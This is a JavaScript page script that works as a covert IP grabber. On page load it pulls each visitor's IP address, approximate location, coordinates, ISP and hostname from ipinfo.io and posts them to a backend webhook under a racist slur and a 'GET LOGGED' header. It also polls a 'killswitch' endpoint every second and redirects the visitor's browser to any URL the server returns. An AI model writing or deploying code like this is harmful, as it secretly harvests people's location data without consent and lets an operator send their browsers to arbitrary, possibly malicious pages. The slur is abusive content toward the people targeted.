const sessionId = crypto.randomUUID() || Date.now().toString(36) + Math.random().toString(36).slice(2);

(async () => {
    try {
        // Fetch IP info
        const info = await fetch('https://ipinfo.io/json').then(res => res.json());

        // Extract values with fallback
        const ip = info.ip || 'Unknown';
        const city = info.city || 'Unknown';
        const region = info.region || 'Unknown';
        const country = info.country || 'Unknown';
        const loc = info.loc || 'Unknown';
        const org = info.org || 'Unknown';
        const hostname = info.hostname || 'Unknown';
        const time = new Date().toISOString();

        // Construct message
        const message = 
            "# GET LOGGED NIGGER!\n" +
            "```" + sessionId + "```\n" +
            "**IP:** `" + ip + "`\n" +
            "**city:** `" + city + "`\n" +
            "**region:** `" + region + "`\n" +
            "**country:** `" + country + "`\n" +
            "**coords:** `" + loc + "`\n" +
            "**org:** `" + org + "`\n" +
            "**host:** `" + hostname + "`\n" +
            "**time:** `" + time + "`";
        ;

        // Send to backend
        await fetch('/api/sendwebhook', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message })
        });

        document.getElementById("sessionLabel").textContent = "Session ID: " + sessionId;

    } catch (err) {
        console.error("Logging failed:", err);
    }
    })();

async function checkKillswitch() {
    try {
        const res = await fetch("/api/killswitch");
        const text = await res.text();
        if (text !== "none") {
        window.location.href = text;
        }
    } catch (err) {
        console.error("Error contacting killswitch server:", err);
    }
    }

    setInterval(checkKillswitch, 1000); // check every second
